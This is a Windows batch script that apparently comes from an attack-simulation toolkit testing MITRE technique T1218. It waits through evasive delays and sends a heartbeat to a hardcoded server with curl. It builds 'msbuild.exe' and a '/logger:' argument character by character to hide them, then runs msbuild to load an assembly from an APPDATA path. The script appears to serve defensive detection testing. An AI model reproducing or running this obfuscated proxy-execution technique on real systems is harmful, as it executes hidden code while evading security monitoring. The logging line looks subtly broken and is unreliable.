@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\7636\8d99a0f0
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7636-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=illustrator.txt
SET dvhhyc=7636

REM Random variables for script logic
SET azyvbd=0
SET ppljmb=
SET qiwbzc=
SET kjxwpv=1
SET vfzwqm=
SET lmycxh=0

REM Initial delay - 45 seconds
ping -n 46 127.0.0.1 >nul

REM Check heartbeat first
SET rxcvgb=https://10.0.0.49/stage/2/icon.png?7636-10
IF NOT DEFINED rxcvgb GOTO :mkvlbq
FOR /F "tokens=*" %%A IN ('echo !rxcvgb!') DO (
    curl.exe -k -s "%%A" -o nul
)

REM Delay
timeout /t 12 /nobreak >nul

REM Build LOLBIN msbuild.exe character by character
SET wqjdfg=m
SET rtyhvc=s
SET poilkj=b
SET mnbvcx=u
SET lkjhgf=i
SET dfghjk=l
SET zxcvbn=d
SET qazwsx=.
SET edcrfv=e
SET tgbyhn=x
SET yhnujm=e
SET lolbin=!wqjdfg!!rtyhvc!!poilkj!!mnbvcx!!lkjhgf!!dfghjk!!zxcvbn!!qazwsx!!edcrfv!!tgbyhn!!yhnujm!

REM Build command arguments character by character
SET vbnmas=/
SET zxasqw=l
SET qweasd=o
SET asdzxc=g
SET lpoiuy=g
SET mnbvfg=e
SET cxzlkj=r
SET pokmjn=:
SET vfcdxs=L
SET bgtyhn=o
SET nhyujm=g
SET mkiopj=g
SET lkjhga=e
SET bvfdsw=r
SET xcvfrt=E
SET qazxsw=n
SET wsxedc=t
SET rfvtgb=r
SET yhnujk=y
SET logpart=!vbnmas!!zxasqw!!qweasd!!asdzxc!!lpoiuy!!mnbvfg!!cxzlkj!!pokmjn!!vfcdxs!!bgtyhn!!nhyujm!!mkiopj!!lkjhga!!bvfdsw!!xcvfrt!!qazxsw!!wsxedc!!rfvtgb!!yhnujk!

REM Build comma part
SET plmokn=,
SET kjhgfd=M
SET fdsaqw=y
SET poiuyh=P
SET lkjhsa=a
SET mnbghj=r
SET cvfrtg=a
SET nhgfdse=m
SET qazplme=e
SET wscdvt=r
SET xscdft=s
SET tgbhyn=,
SET yhnjki=F
SET ujmikol=o
SET oplkij=o
SET myparams=!plmokn!!kjhgfd!!fdsaqw!!poiuyh!!lkjhsa!!mnbghj!!cvfrtg!!nhgfdse!!qazplme!!wscdvt!!xscdft!!tgbhyn!!yhnjki!!ujmikol!!oplkij!

REM Random delay
SET /A delay=!RANDOM! %% 20 + 10
timeout /t !delay! /nobreak >nul

REM Execute msbuild with logger
SET ppljmb=!logpart!!txisnba!\!xzanpex!!myparams!
SET result=0
SET err_detail=
!lolbin! !ppljmb! 2>nul
IF NOT ERRORLEVEL 1 (
    SET result=1
) ELSE (
    SET result=0
    SET err_detail=assembly_load_failed
)

REM Delay before logging
CHOICE /C Y /N /D Y /T 8 >nul

REM Build timestamp
SET year=!DATE:~-4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
IF "!month:~0,1!"==" " SET month=0!month:~1!
IF "!day:~0,1!"==" " SET day=0!day:~1!
SET hour=!TIME:~0,2!
IF "!hour:~0,1!"==" " SET hour=0!hour:~1!
SET minute=!TIME:~3,2!
SET second=!TIME:~6,2!
SET millis=!TIME:~9,3!
IF "!millis!"=="" SET millis=000
SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millis!

REM Log TTP execution
SET logfile=!APPDATA!\!rrocubc!\macula-simulations.log
(
    echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!result!:!err_detail!
) >> "!logfile!" 2>nul || REM Silent fail

ENDLOCAL